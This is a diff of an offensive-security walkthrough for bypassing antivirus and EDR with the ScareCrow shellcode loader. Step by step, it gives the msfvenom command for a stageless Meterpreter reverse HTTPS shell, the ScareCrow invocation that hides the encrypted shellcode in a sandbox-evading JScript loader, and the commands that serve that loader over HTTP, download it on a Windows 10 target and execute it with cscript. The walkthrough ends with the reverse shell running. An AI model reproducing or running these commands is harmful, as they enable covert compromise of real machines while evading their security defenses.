@@ -2,7 +2,7 @@
 Antivirus/EDR bypass using the shellcode loader 'ScareCrow'
 =========================================================================================================================================================
 
-Source: => https://github.com/optiv/ScareCrow
+Source => https://github.com/optiv/ScareCrow
 
 ScareCrow - Payload creation framework designed around EDR bypass. 
 
@@ -13,7 +13,7 @@ Main features
 > Use of direct syscalls 
 > AMSI bypass
 > ETW bypass
-> Fake signature coding 
+> Fake code signing signature 
 > ...
 
 
@@ -106,13 +106,13 @@ Step 2 - Generate a stageless Meterpreter (x64) https reverse shell using Msfven
 msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter-x64-reverse-https-raw.bin
 
 
---------------------------------------------------------------------------------------------------------
-Step 3 - Generate with ScareCrow a "shellcode loader" (.js) embedding our shellcode that is encrypted
---------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------
+Step 3 - Generate with ScareCrow a "shellcode loader" (in javascript) embedding our shellcode that is encrypted
+------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/ScareCrow-main$ ./ScareCrow -I /home/jeff/Documents/Tools/Windows/meterpreter-x64-stageless-reverse-https-raw.bin 
                                                         -nosign -Loader wscript -sandbox -o ./loaderjfc
-        
+
   _________                           _________                       
  /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
  \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
@@ -146,3 +146,20 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.1.113 - - [06/Jan/2023 15:53:14] "GET / HTTP/1.1" 200 -
 192.168.1.113 - - [06/Jan/2023 15:53:16] "GET /loaderjfc HTTP/1.1" 200 -
 
+
+PS C:\temp> wget -URI http://192.168.1.30:8080/loaderjfc  -OutFile loaderjfc
+
+PS C:\temp> cmd
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\temp>
+
+C:\temp> cscript //E:jscript loaderjfc
+Microsoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 5 - Enjoy the Meterpreter reverse shell running on the target Windows 10 laptop 
+------------------------------------------------------------------------------------------------------------------------------------
